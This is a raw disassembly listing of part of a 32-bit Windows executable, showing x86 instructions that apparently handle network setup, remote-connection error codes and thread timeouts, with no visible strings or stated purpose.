  402483:	50                   	push   %eax
  402484:	89 44 24 14          	mov    %eax,0x14(%esp)
  402488:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40248c:	56                   	push   %esi
  40248d:	89 44 24 20          	mov    %eax,0x20(%esp)
  402491:	89 44 24 24          	mov    %eax,0x24(%esp)
  402495:	89 44 24 28          	mov    %eax,0x28(%esp)
  402499:	89 44 24 14          	mov    %eax,0x14(%esp)
  40249d:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4024a1:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4024a5:	89 44 24 18          	mov    %eax,0x18(%esp)
  4024a9:	89 44 24 30          	mov    %eax,0x30(%esp)
  4024ad:	57                   	push   %edi
  4024ae:	8d 44 24 18          	lea    0x18(%esp),%eax
  4024b2:	8d 4c 24 17          	lea    0x17(%esp),%ecx
  4024b6:	8d 54 24 38          	lea    0x38(%esp),%edx
  4024ba:	50                   	push   %eax
  4024bb:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  4024bf:	c7 44 24 28 03 00 00 	movl   $0x3,0x28(%esp)
  4024c6:	00 
  4024c7:	89 54 24 30          	mov    %edx,0x30(%esp)
  4024cb:	e8 0e 19 00 00       	call   0x403dde
  4024d0:	85 c0                	test   %eax,%eax
  4024d2:	75 07                	jne    0x4024db
  4024d4:	c6 05 a4 60 42 00 01 	movb   $0x1,0x4260a4
  4024db:	33 c9                	xor    %ecx,%ecx
  4024dd:	85 c0                	test   %eax,%eax
  4024df:	0f 94 c1             	sete   %cl
  4024e2:	8a c1                	mov    %cl,%al
  4024e4:	8b 8c 24 30 01 00 00 	mov    0x130(%esp),%ecx
  4024eb:	5f                   	pop    %edi
  4024ec:	5e                   	pop    %esi
  4024ed:	33 cc                	xor    %esp,%ecx
  4024ef:	e8 22 1f 00 00       	call   0x404416
  4024f4:	81 c4 2c 01 00 00    	add    $0x12c,%esp
  4024fa:	c3                   	ret
  4024fb:	cc                   	int3
  4024fc:	cc                   	int3
  4024fd:	cc                   	int3
  4024fe:	cc                   	int3
  4024ff:	cc                   	int3
  402500:	81 ec 14 03 00 00    	sub    $0x314,%esp
  402506:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  40250b:	33 c4                	xor    %esp,%eax
  40250d:	89 84 24 10 03 00 00 	mov    %eax,0x310(%esp)
  402514:	8b 84 24 20 03 00 00 	mov    0x320(%esp),%eax
  40251b:	53                   	push   %ebx
  40251c:	8b 9c 24 20 03 00 00 	mov    0x320(%esp),%ebx
  402523:	56                   	push   %esi
  402524:	33 f6                	xor    %esi,%esi
  402526:	80 bc 24 20 03 00 00 	cmpb   $0x0,0x320(%esp)
  40252d:	00 
  40252e:	57                   	push   %edi
  40252f:	8b bc 24 30 03 00 00 	mov    0x330(%esp),%edi
  402536:	0f 84 a5 00 00 00    	je     0x4025e1
  40253c:	50                   	push   %eax
  40253d:	53                   	push   %ebx
  40253e:	e8 ad fc ff ff       	call   0x4021f0
  402543:	83 c4 08             	add    $0x8,%esp
  402546:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40254a:	50                   	push   %eax
  40254b:	8d 8c 24 18 01 00 00 	lea    0x118(%esp),%ecx
  402552:	51                   	push   %ecx
  402553:	c7 44 24 14 04 01 00 	movl   $0x104,0x14(%esp)
  40255a:	00 
  40255b:	ff 15 a8 e0 41 00    	call   *0x41e0a8
  402561:	8d 94 24 14 01 00 00 	lea    0x114(%esp),%edx
  402568:	53                   	push   %ebx
  402569:	52                   	push   %edx
  40256a:	e8 dc 20 00 00       	call   0x40464b
  40256f:	83 c4 08             	add    $0x8,%esp
  402572:	85 c0                	test   %eax,%eax
  402574:	75 28                	jne    0x40259e
  402576:	68 04 01 00 00       	push   $0x104
  40257b:	8d 84 24 1c 02 00 00 	lea    0x21c(%esp),%eax
  402582:	50                   	push   %eax
  402583:	ff 15 a4 e0 41 00    	call   *0x41e0a4
  402589:	57                   	push   %edi
  40258a:	8d 8c 24 1c 02 00 00 	lea    0x21c(%esp),%ecx
  402591:	51                   	push   %ecx
  402592:	68 74 08 42 00       	push   $0x420874
  402597:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  40259b:	52                   	push   %edx
  40259c:	eb 0c                	jmp    0x4025aa
  40259e:	57                   	push   %edi
  40259f:	53                   	push   %ebx
  4025a0:	68 64 08 42 00       	push   $0x420864
  4025a5:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4025a9:	50                   	push   %eax
  4025aa:	e8 a6 24 00 00       	call   0x404a55
  4025af:	8b 3d f8 e0 41 00    	mov    0x41e0f8,%edi
  4025b5:	83 c4 10             	add    $0x10,%esp
  4025b8:	55                   	push   %ebp
  4025b9:	8b 2d 18 e1 41 00    	mov    0x41e118,%ebp
  4025bf:	90                   	nop
  4025c0:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4025c4:	51                   	push   %ecx
  4025c5:	ff 15 a0 e0 41 00    	call   *0x41e0a0
  4025cb:	85 c0                	test   %eax,%eax
  4025cd:	75 11                	jne    0x4025e0
  4025cf:	ff d5                	call   *%ebp
  4025d1:	83 f8 05             	cmp    $0x5,%eax
  4025d4:	75 0a                	jne    0x4025e0
  4025d6:	6a 64                	push   $0x64
  4025d8:	ff d7                	call   *%edi
  4025da:	46                   	inc    %esi
  4025db:	83 fe 0a             	cmp    $0xa,%esi
  4025de:	72 e0                	jb     0x4025c0
  4025e0:	5d                   	pop    %ebp
  4025e1:	53                   	push   %ebx
  4025e2:	e8 d9 fd ff ff       	call   0x4023c0
  4025e7:	8b 8c 24 20 03 00 00 	mov    0x320(%esp),%ecx
  4025ee:	83 c4 04             	add    $0x4,%esp
  4025f1:	5f                   	pop    %edi
  4025f2:	5e                   	pop    %esi
  4025f3:	5b                   	pop    %ebx
  4025f4:	33 cc                	xor    %esp,%ecx
  4025f6:	e8 1b 1e 00 00       	call   0x404416
  4025fb:	81 c4 14 03 00 00    	add    $0x314,%esp
  402601:	c3                   	ret
  402602:	cc                   	int3
  402603:	cc                   	int3
  402604:	cc                   	int3
  402605:	cc                   	int3
  402606:	cc                   	int3
  402607:	cc                   	int3
  402608:	cc                   	int3
  402609:	cc                   	int3
  40260a:	cc                   	int3
  40260b:	cc                   	int3
  40260c:	cc                   	int3
  40260d:	cc                   	int3
  40260e:	cc                   	int3
  40260f:	cc                   	int3
  402610:	81 ec 18 02 00 00    	sub    $0x218,%esp
  402616:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  40261b:	33 c4                	xor    %esp,%eax
  40261d:	89 84 24 14 02 00 00 	mov    %eax,0x214(%esp)
  402624:	80 bc 24 28 02 00 00 	cmpb   $0x0,0x228(%esp)
  40262b:	00 
  40262c:	8b 84 24 20 02 00 00 	mov    0x220(%esp),%eax
  402633:	8b 8c 24 2c 02 00 00 	mov    0x22c(%esp),%ecx
  40263a:	53                   	push   %ebx
  40263b:	8b 9c 24 3c 02 00 00 	mov    0x23c(%esp),%ebx
  402642:	55                   	push   %ebp
  402643:	8b ac 24 48 02 00 00 	mov    0x248(%esp),%ebp
  40264a:	56                   	push   %esi
  40264b:	8b b4 24 40 02 00 00 	mov    0x240(%esp),%esi
  402652:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402656:	8b 84 24 30 02 00 00 	mov    0x230(%esp),%eax
  40265d:	57                   	push   %edi
  40265e:	8b bc 24 4c 02 00 00 	mov    0x24c(%esp),%edi
  402665:	89 44 24 14          	mov    %eax,0x14(%esp)
  402669:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  40266d:	74 47                	je     0x4026b6
  40266f:	80 3f 00             	cmpb   $0x0,(%edi)
  402672:	75 42                	jne    0x4026b6
  402674:	68 04 01 00 00       	push   $0x104
  402679:	8d 94 24 24 01 00 00 	lea    0x124(%esp),%edx
  402680:	52                   	push   %edx
  402681:	ff 15 a4 e0 41 00    	call   *0x41e0a4
  402687:	8d 84 24 20 01 00 00 	lea    0x120(%esp),%eax
  40268e:	6a 5c                	push   $0x5c
  402690:	50                   	push   %eax
  402691:	e8 a4 28 00 00       	call   0x404f3a
  402696:	56                   	push   %esi
  402697:	8d 8c 24 2c 01 00 00 	lea    0x12c(%esp),%ecx
  40269e:	51                   	push   %ecx
  40269f:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  4026a3:	68 74 08 42 00       	push   $0x420874
  4026a8:	52                   	push   %edx
  4026a9:	c6 00 00             	movb   $0x0,(%eax)
  4026ac:	e8 a4 23 00 00       	call   0x404a55
  4026b1:	83 c4 18             	add    $0x18,%esp
  4026b4:	eb 20                	jmp    0x4026d6
  4026b6:	56                   	push   %esi
  4026b7:	50                   	push   %eax
  4026b8:	8d 44 24 24          	lea    0x24(%esp),%eax
  4026bc:	68 64 08 42 00       	push   $0x420864
  4026c1:	50                   	push   %eax
  4026c2:	e8 8e 23 00 00       	call   0x404a55
  4026c7:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4026cb:	55                   	push   %ebp
  4026cc:	57                   	push   %edi
  4026cd:	51                   	push   %ecx
  4026ce:	e8 4d fd ff ff       	call   0x402420
  4026d3:	83 c4 1c             	add    $0x1c,%esp
  4026d6:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  4026da:	52                   	push   %edx
  4026db:	53                   	push   %ebx
  4026dc:	e8 5f fc ff ff       	call   0x402340
  4026e1:	83 c4 08             	add    $0x8,%esp
  4026e4:	84 c0                	test   %al,%al
  4026e6:	0f 85 2e 01 00 00    	jne    0x40281a
  4026ec:	8b 35 18 e1 41 00    	mov    0x41e118,%esi
  4026f2:	38 84 24 2c 02 00 00 	cmp    %al,0x22c(%esp)
  4026f9:	75 0b                	jne    0x402706
  4026fb:	ff d6                	call   *%esi
  4026fd:	83 f8 20             	cmp    $0x20,%eax
  402700:	0f 84 14 01 00 00    	je     0x40281a
  402706:	ff d6                	call   *%esi
  402708:	83 f8 05             	cmp    $0x5,%eax
  40270b:	74 13                	je     0x402720
  40270d:	3d 2e 05 00 00       	cmp    $0x52e,%eax
  402712:	74 0c                	je     0x402720
  402714:	3d e7 03 00 00       	cmp    $0x3e7,%eax
  402719:	74 05                	je     0x402720
  40271b:	83 f8 35             	cmp    $0x35,%eax
  40271e:	75 16                	jne    0x402736
  402720:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402724:	50                   	push   %eax
  402725:	53                   	push   %ebx
  402726:	e8 15 fc ff ff       	call   0x402340
  40272b:	83 c4 08             	add    $0x8,%esp
  40272e:	84 c0                	test   %al,%al
  402730:	0f 85 e4 00 00 00    	jne    0x40281a
  402736:	e8 85 fb ff ff       	call   0x4022c0
  40273b:	80 bc 24 54 02 00 00 	cmpb   $0x0,0x254(%esp)
  402742:	00 
  402743:	0f 84 c0 00 00 00    	je     0x402809
  402749:	8a 9c 24 38 02 00 00 	mov    0x238(%esp),%bl
  402750:	84 db                	test   %bl,%bl
  402752:	74 1e                	je     0x402772
  402754:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  402758:	51                   	push   %ecx
  402759:	68 84 09 42 00       	push   $0x420984
  40275e:	e8 d2 2a 00 00       	call   0x405235
  402763:	83 c0 40             	add    $0x40,%eax
  402766:	50                   	push   %eax
  402767:	e8 23 29 00 00       	call   0x40508f
  40276c:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  402770:	eb 18                	jmp    0x40278a
  402772:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402776:	57                   	push   %edi
  402777:	68 6c 09 42 00       	push   $0x42096c
  40277c:	e8 b4 2a 00 00       	call   0x405235
  402781:	83 c0 40             	add    $0x40,%eax
  402784:	50                   	push   %eax
  402785:	e8 05 29 00 00       	call   0x40508f
  40278a:	83 c4 0c             	add    $0xc,%esp
  40278d:	ff d6                	call   *%esi
  40278f:	8b f0                	mov    %eax,%esi
  402791:	56                   	push   %esi
  402792:	e8 99 fa ff ff       	call   0x402230
  402797:	83 c4 04             	add    $0x4,%esp
  40279a:	83 fe 43             	cmp    $0x43,%esi
  40279d:	74 28                	je     0x4027c7
  40279f:	83 fe 35             	cmp    $0x35,%esi
  4027a2:	74 23                	je     0x4027c7
  4027a4:	81 fe d0 04 00 00    	cmp    $0x4d0,%esi
  4027aa:	74 08                	je     0x4027b4
  4027ac:	81 fe cf 04 00 00    	cmp    $0x4cf,%esi
  4027b2:	75 55                	jne    0x402809
  4027b4:	84 db                	test   %bl,%bl
  4027b6:	74 07                	je     0x4027bf
  4027b8:	68 2c 09 42 00       	push   $0x42092c
  4027bd:	eb 11                	jmp    0x4027d0
  4027bf:	57                   	push   %edi
  4027c0:	68 e8 08 42 00       	push   $0x4208e8
  4027c5:	eb 31                	jmp    0x4027f8
  4027c7:	84 db                	test   %bl,%bl
  4027c9:	74 27                	je     0x4027f2
  4027cb:	68 b8 08 42 00       	push   $0x4208b8
  4027d0:	e8 60 2a 00 00       	call   0x405235
  4027d5:	83 c0 40             	add    $0x40,%eax
  4027d8:	50                   	push   %eax
  4027d9:	e8 b1 28 00 00       	call   0x40508f
  4027de:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4027e2:	83 c4 08             	add    $0x8,%esp
  4027e5:	52                   	push   %edx
  4027e6:	e8 d5 fb ff ff       	call   0x4023c0
  4027eb:	83 c4 04             	add    $0x4,%esp
  4027ee:	32 c0                	xor    %al,%al
  4027f0:	eb 2a                	jmp    0x40281c
  4027f2:	57                   	push   %edi
  4027f3:	68 7c 08 42 00       	push   $0x42087c
  4027f8:	e8 38 2a 00 00       	call   0x405235
  4027fd:	83 c0 40             	add    $0x40,%eax
  402800:	50                   	push   %eax
  402801:	e8 89 28 00 00       	call   0x40508f
  402806:	83 c4 0c             	add    $0xc,%esp
  402809:	8b 54 24 14          	mov    0x14(%esp),%edx
  40280d:	52                   	push   %edx
  40280e:	e8 ad fb ff ff       	call   0x4023c0
  402813:	83 c4 04             	add    $0x4,%esp
  402816:	32 c0                	xor    %al,%al
  402818:	eb 02                	jmp    0x40281c
  40281a:	b0 01                	mov    $0x1,%al
  40281c:	8b 8c 24 24 02 00 00 	mov    0x224(%esp),%ecx
  402823:	5f                   	pop    %edi
  402824:	5e                   	pop    %esi
  402825:	5d                   	pop    %ebp
  402826:	5b                   	pop    %ebx
  402827:	33 cc                	xor    %esp,%ecx
  402829:	e8 e8 1b 00 00       	call   0x404416
  40282e:	81 c4 18 02 00 00    	add    $0x218,%esp
  402834:	c3                   	ret
  402835:	cc                   	int3
  402836:	cc                   	int3
  402837:	cc                   	int3
  402838:	cc                   	int3
  402839:	cc                   	int3
  40283a:	cc                   	int3
  40283b:	cc                   	int3
  40283c:	cc                   	int3
  40283d:	cc                   	int3
  40283e:	cc                   	int3
  40283f:	cc                   	int3
  402840:	53                   	push   %ebx
  402841:	56                   	push   %esi
  402842:	8b 74 24 0c          	mov    0xc(%esp),%esi
  402846:	0f b6 46 28          	movzbl 0x28(%esi),%eax
  40284a:	8b 4e 24             	mov    0x24(%esi),%ecx
  40284d:	8b 56 20             	mov    0x20(%esi),%edx
  402850:	50                   	push   %eax
  402851:	8b 46 1c             	mov    0x1c(%esi),%eax
  402854:	51                   	push   %ecx
  402855:	8b 4e 18             	mov    0x18(%esi),%ecx
  402858:	52                   	push   %edx
  402859:	8b 56 14             	mov    0x14(%esi),%edx
  40285c:	50                   	push   %eax
  40285d:	8b 46 10             	mov    0x10(%esi),%eax
  402860:	51                   	push   %ecx
  402861:	0f b6 4e 0c          	movzbl 0xc(%esi),%ecx
  402865:	52                   	push   %edx
  402866:	8b 56 08             	mov    0x8(%esi),%edx
  402869:	50                   	push   %eax
  40286a:	8b 46 04             	mov    0x4(%esi),%eax
  40286d:	51                   	push   %ecx
  40286e:	0f b6 0e             	movzbl (%esi),%ecx
  402871:	52                   	push   %edx
  402872:	50                   	push   %eax
  402873:	51                   	push   %ecx
  402874:	e8 97 fd ff ff       	call   0x402610
  402879:	56                   	push   %esi
  40287a:	8a d8                	mov    %al,%bl
  40287c:	e8 13 17 00 00       	call   0x403f94
  402881:	83 c4 30             	add    $0x30,%esp
  402884:	5e                   	pop    %esi
  402885:	0f b6 c3             	movzbl %bl,%eax
  402888:	5b                   	pop    %ebx
  402889:	c2 04 00             	ret    $0x4
  40288c:	cc                   	int3
  40288d:	cc                   	int3
  40288e:	cc                   	int3
  40288f:	cc                   	int3
  402890:	81 ec cc 05 00 00    	sub    $0x5cc,%esp
  402896:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  40289b:	33 c4                	xor    %esp,%eax
  40289d:	89 84 24 c8 05 00 00 	mov    %eax,0x5c8(%esp)
  4028a4:	8b 84 24 e4 05 00 00 	mov    0x5e4(%esp),%eax
  4028ab:	8b 8c 24 e8 05 00 00 	mov    0x5e8(%esp),%ecx
  4028b2:	8b 94 24 ec 05 00 00 	mov    0x5ec(%esp),%edx
  4028b9:	53                   	push   %ebx
  4028ba:	8b 9c 24 e0 05 00 00 	mov    0x5e0(%esp),%ebx
  4028c1:	55                   	push   %ebp
  4028c2:	8b ac 24 e8 05 00 00 	mov    0x5e8(%esp),%ebp
  4028c9:	56                   	push   %esi
  4028ca:	8b b4 24 e0 05 00 00 	mov    0x5e0(%esp),%esi
  4028d1:	57                   	push   %edi
  4028d2:	8b bc 24 e8 05 00 00 	mov    0x5e8(%esp),%edi
  4028d9:	89 44 24 20          	mov    %eax,0x20(%esp)
  4028dd:	8d 44 24 24          	lea    0x24(%esp),%eax
  4028e1:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  4028e5:	50                   	push   %eax
  4028e6:	8d 8c 24 d8 04 00 00 	lea    0x4d8(%esp),%ecx
  4028ed:	51                   	push   %ecx
  4028ee:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  4028f2:	89 54 24 20          	mov    %edx,0x20(%esp)
  4028f6:	c7 44 24 2c 04 01 00 	movl   $0x104,0x2c(%esp)
  4028fd:	00 
  4028fe:	ff 15 a8 e0 41 00    	call   *0x41e0a8
  402904:	8d 94 24 d4 04 00 00 	lea    0x4d4(%esp),%edx
  40290b:	56                   	push   %esi
  40290c:	52                   	push   %edx
  40290d:	e8 39 1d 00 00       	call   0x40464b
  402912:	83 c4 08             	add    $0x8,%esp
  402915:	85 c0                	test   %eax,%eax
  402917:	0f 85 92 00 00 00    	jne    0x4029af
  40291d:	68 38 0a 42 00       	push   $0x420a38
  402922:	c6 44 24 18 01       	movb   $0x1,0x18(%esp)
  402927:	e8 09 29 00 00       	call   0x405235
  40292c:	83 c0 40             	add    $0x40,%eax
  40292f:	50                   	push   %eax
  402930:	e8 5a 27 00 00       	call   0x40508f
  402935:	83 c4 08             	add    $0x8,%esp
  402938:	80 3d a5 60 42 00 00 	cmpb   $0x0,0x4260a5
  40293f:	75 16                	jne    0x402957
  402941:	8d 44 24 38          	lea    0x38(%esp),%eax
  402945:	50                   	push   %eax
  402946:	68 02 02 00 00       	push   $0x202
  40294b:	e8 82 14 00 00       	call   0x403dd2
  402950:	c6 05 a5 60 42 00 01 	movb   $0x1,0x4260a5
  402957:	68 04 01 00 00       	push   $0x104
  40295c:	8d 8c 24 d4 03 00 00 	lea    0x3d4(%esp),%ecx
  402963:	51                   	push   %ecx
  402964:	e8 63 14 00 00       	call   0x403dcc
  402969:	8d 94 24 d0 03 00 00 	lea    0x3d0(%esp),%edx
  402970:	52                   	push   %edx
  402971:	e8 50 14 00 00       	call   0x403dc6
  402976:	0f bf 48 0a          	movswl 0xa(%eax),%ecx
  40297a:	8b 50 0c             	mov    0xc(%eax),%edx
  40297d:	8b 02                	mov    (%edx),%eax
  40297f:	51                   	push   %ecx
  402980:	50                   	push   %eax
  402981:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  402985:	51                   	push   %ecx
  402986:	e8 65 1d 00 00       	call   0x4046f0
  40298b:	8b 54 24 38          	mov    0x38(%esp),%edx
  40298f:	83 c4 0c             	add    $0xc,%esp
  402992:	52                   	push   %edx
  402993:	e8 28 14 00 00       	call   0x403dc0
  402998:	8d 94 24 c8 01 00 00 	lea    0x1c8(%esp),%edx
  40299f:	90                   	nop
  4029a0:	8a 08                	mov    (%eax),%cl
  4029a2:	88 0a                	mov    %cl,(%edx)
  4029a4:	40                   	inc    %eax
  4029a5:	42                   	inc    %edx
  4029a6:	84 c9                	test   %cl,%cl
  4029a8:	75 f6                	jne    0x4029a0
  4029aa:	e9 e7 00 00 00       	jmp    0x402a96
  4029af:	8d 94 24 c8 01 00 00 	lea    0x1c8(%esp),%edx
  4029b6:	c6 44 24 14 00       	movb   $0x0,0x14(%esp)
  4029bb:	8b c6                	mov    %esi,%eax
  4029bd:	2b d6                	sub    %esi,%edx
  4029bf:	90                   	nop
  4029c0:	8a 08                	mov    (%eax),%cl
  4029c2:	88 0c 02             	mov    %cl,(%edx,%eax,1)
  4029c5:	40                   	inc    %eax
  4029c6:	84 c9                	test   %cl,%cl
  4029c8:	75 f6                	jne    0x4029c0
  4029ca:	56                   	push   %esi
  4029cb:	68 24 0a 42 00       	push   $0x420a24
  4029d0:	e8 60 28 00 00       	call   0x405235
  4029d5:	83 c0 40             	add    $0x40,%eax
  4029d8:	50                   	push   %eax
  4029d9:	e8 b1 26 00 00       	call   0x40508f
  4029de:	8b ac 24 10 06 00 00 	mov    0x610(%esp),%ebp
  4029e5:	83 c4 0c             	add    $0xc,%esp
  4029e8:	83 fd ff             	cmp    $0xffffffff,%ebp
  4029eb:	0f 84 a1 00 00 00    	je     0x402a92
  4029f1:	6a 2c                	push   $0x2c
  4029f3:	e8 f3 16 00 00       	call   0x4040eb
  4029f8:	8a 8c 24 e4 05 00 00 	mov    0x5e4(%esp),%cl
  4029ff:	6a 00                	push   $0x0
  402a01:	88 08                	mov    %cl,(%eax)
  402a03:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  402a07:	6a 00                	push   $0x0
  402a09:	50                   	push   %eax
  402a0a:	8d 94 24 d8 01 00 00 	lea    0x1d8(%esp),%edx
  402a11:	89 50 08             	mov    %edx,0x8(%eax)
  402a14:	8b 54 24 30          	mov    0x30(%esp),%edx
  402a18:	89 48 18             	mov    %ecx,0x18(%eax)
  402a1b:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  402a1f:	68 40 28 40 00       	push   $0x402840
  402a24:	89 50 1c             	mov    %edx,0x1c(%eax)
  402a27:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  402a2b:	89 48 20             	mov    %ecx,0x20(%eax)
  402a2e:	8a 8c 24 1c 06 00 00 	mov    0x61c(%esp),%cl
  402a35:	6a 00                	push   $0x0
  402a37:	6a 00                	push   $0x0
  402a39:	89 70 04             	mov    %esi,0x4(%eax)
  402a3c:	c6 40 0c 00          	movb   $0x0,0xc(%eax)
  402a40:	89 78 10             	mov    %edi,0x10(%eax)
  402a43:	89 58 14             	mov    %ebx,0x14(%eax)
  402a46:	89 50 24             	mov    %edx,0x24(%eax)
  402a49:	88 48 28             	mov    %cl,0x28(%eax)
  402a4c:	e8 9f 2e 00 00       	call   0x4058f0
  402a51:	69 ed e8 03 00 00    	imul   $0x3e8,%ebp,%ebp
  402a57:	83 c4 1c             	add    $0x1c,%esp
  402a5a:	55                   	push   %ebp
  402a5b:	50                   	push   %eax
  402a5c:	ff 15 b8 e0 41 00    	call   *0x41e0b8
  402a62:	3d 02 01 00 00       	cmp    $0x102,%eax
  402a67:	75 6e                	jne    0x402ad7
  402a69:	56                   	push   %esi
  402a6a:	68 0c 0a 42 00       	push   $0x420a0c
  402a6f:	e8 c1 27 00 00       	call   0x405235
  402a74:	83 c0 40             	add    $0x40,%eax
  402a77:	50                   	push   %eax
  402a78:	e8 12 26 00 00       	call   0x40508f
  402a7d:	83 c4 0c             	add    $0xc,%esp
  402a80:	68 b4 05 00 00       	push   $0x5b4
  402a85:	ff 15 fc e0 41 00    	call   *0x41e0fc
  402a8b:	32 c0                	xor    %al,%al
  402a8d:	e9 1e 01 00 00       	jmp    0x402bb0
  402a92:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  402a96:	8b 94 24 08 06 00 00 	mov    0x608(%esp),%edx
  402a9d:	8b 44 24 18          	mov    0x18(%esp),%eax
  402aa1:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402aa5:	52                   	push   %edx
  402aa6:	8b 54 24 24          	mov    0x24(%esp),%edx
  402aaa:	50                   	push   %eax
  402aab:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402aaf:	51                   	push   %ecx
  402ab0:	52                   	push   %edx
  402ab1:	8b 94 24 f0 05 00 00 	mov    0x5f0(%esp),%edx
  402ab8:	55                   	push   %ebp
  402ab9:	53                   	push   %ebx
  402aba:	57                   	push   %edi
  402abb:	50                   	push   %eax
  402abc:	8d 8c 24 e8 01 00 00 	lea    0x1e8(%esp),%ecx
  402ac3:	51                   	push   %ecx
  402ac4:	56                   	push   %esi
  402ac5:	52                   	push   %edx
  402ac6:	e8 45 fb ff ff       	call   0x402610
  402acb:	83 c4 2c             	add    $0x2c,%esp
  402ace:	84 c0                	test   %al,%al
  402ad0:	75 09                	jne    0x402adb
  402ad2:	e9 d9 00 00 00       	jmp    0x402bb0
  402ad7:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  402adb:	e8 e0 f7 ff ff       	call   0x4022c0
  402ae0:	80 7c 24 14 00       	cmpb   $0x0,0x14(%esp)
  402ae5:	b8 fc 09 42 00       	mov    $0x4209fc,%eax
  402aea:	75 02                	jne    0x402aee
  402aec:	8b c6                	mov    %esi,%eax
  402aee:	50                   	push   %eax
  402aef:	57                   	push   %edi
  402af0:	68 dc 09 42 00       	push   $0x4209dc
  402af5:	e8 3b 27 00 00       	call   0x405235
  402afa:	83 c0 40             	add    $0x40,%eax
  402afd:	50                   	push   %eax
  402afe:	e8 8c 25 00 00       	call   0x40508f
  402b03:	55                   	push   %ebp
  402b04:	8d 84 24 e0 02 00 00 	lea    0x2e0(%esp),%eax
  402b0b:	68 c8 09 42 00       	push   $0x4209c8
  402b10:	50                   	push   %eax
  402b11:	e8 3f 1f 00 00       	call   0x404a55
  402b16:	8b 8c 24 1c 06 00 00 	mov    0x61c(%esp),%ecx
  402b1d:	51                   	push   %ecx
  402b1e:	8d 94 24 ec 02 00 00 	lea    0x2ec(%esp),%edx
  402b25:	52                   	push   %edx
  402b26:	53                   	push   %ebx
  402b27:	57                   	push   %edi
  402b28:	56                   	push   %esi
  402b29:	e8 22 f6 ff ff       	call   0x402150
  402b2e:	83 c4 30             	add    $0x30,%esp
  402b31:	85 c0                	test   %eax,%eax
  402b33:	75 79                	jne    0x402bae
  402b35:	ff 15 18 e1 41 00    	call   *0x41e118
  402b3b:	89 44 24 10          	mov    %eax,0x10(%esp)
  402b3f:	e8 7c f7 ff ff       	call   0x4022c0
  402b44:	83 7c 24 10 02       	cmpl   $0x2,0x10(%esp)
  402b49:	0f 85 7a 00 00 00    	jne    0x402bc9
  402b4f:	8b 84 24 08 06 00 00 	mov    0x608(%esp),%eax
  402b56:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  402b5a:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402b5e:	50                   	push   %eax
  402b5f:	8b 44 24 24          	mov    0x24(%esp),%eax
  402b63:	51                   	push   %ecx
  402b64:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402b68:	52                   	push   %edx
  402b69:	50                   	push   %eax
  402b6a:	8b 84 24 f0 05 00 00 	mov    0x5f0(%esp),%eax
  402b71:	55                   	push   %ebp
  402b72:	53                   	push   %ebx
  402b73:	57                   	push   %edi
  402b74:	51                   	push   %ecx
  402b75:	8d 94 24 e8 01 00 00 	lea    0x1e8(%esp),%edx
  402b7c:	52                   	push   %edx
  402b7d:	56                   	push   %esi
  402b7e:	50                   	push   %eax
  402b7f:	e8 8c fa ff ff       	call   0x402610
  402b84:	83 c4 2c             	add    $0x2c,%esp
  402b87:	84 c0                	test   %al,%al
  402b89:	0f 84 fc fe ff ff    	je     0x402a8b
  402b8f:	8b 8c 24 00 06 00 00 	mov    0x600(%esp),%ecx
  402b96:	51                   	push   %ecx
  402b97:	8d 94 24 d0 02 00 00 	lea    0x2d0(%esp),%edx
  402b9e:	52                   	push   %edx
  402b9f:	53                   	push   %ebx
  402ba0:	57                   	push   %edi
  402ba1:	56                   	push   %esi
  402ba2:	e8 a9 f5 ff ff       	call   0x402150
  402ba7:	83 c4 14             	add    $0x14,%esp
  402baa:	85 c0                	test   %eax,%eax
  402bac:	74 87                	je     0x402b35
  402bae:	b0 01                	mov    $0x1,%al
  402bb0:	8b 8c 24 d8 05 00 00 	mov    0x5d8(%esp),%ecx
  402bb7:	5f                   	pop    %edi
  402bb8:	5e                   	pop    %esi
  402bb9:	5d                   	pop    %ebp
  402bba:	5b                   	pop    %ebx
  402bbb:	33 cc                	xor    %esp,%ecx
  402bbd:	e8 54 18 00 00       	call   0x404416
  402bc2:	81 c4 cc 05 00 00    	add    $0x5cc,%esp
  402bc8:	c3                   	ret
  402bc9:	80 bc 24 08 06 00 00 	cmpb   $0x0,0x608(%esp)
  402bd0:	00 
  402bd1:	74 22                	je     0x402bf5
  402bd3:	56                   	push   %esi
  402bd4:	57                   	push   %edi
  402bd5:	68 a4 09 42 00       	push   $0x4209a4
  402bda:	e8 56 26 00 00       	call   0x405235
  402bdf:	83 c0 40             	add    $0x40,%eax
  402be2:	50                   	push   %eax
  402be3:	e8 a7 24 00 00       	call   0x40508f
  402be8:	8b 44 24 20          	mov    0x20(%esp),%eax
  402bec:	50                   	push   %eax
  402bed:	e8 3e f6 ff ff       	call   0x402230
  402bf2:	83 c4 14             	add    $0x14,%esp
  402bf5:	8b 8c 24 e0 05 00 00 	mov    0x5e0(%esp),%ecx
  402bfc:	55                   	push   %ebp
  402bfd:	53                   	push   %ebx
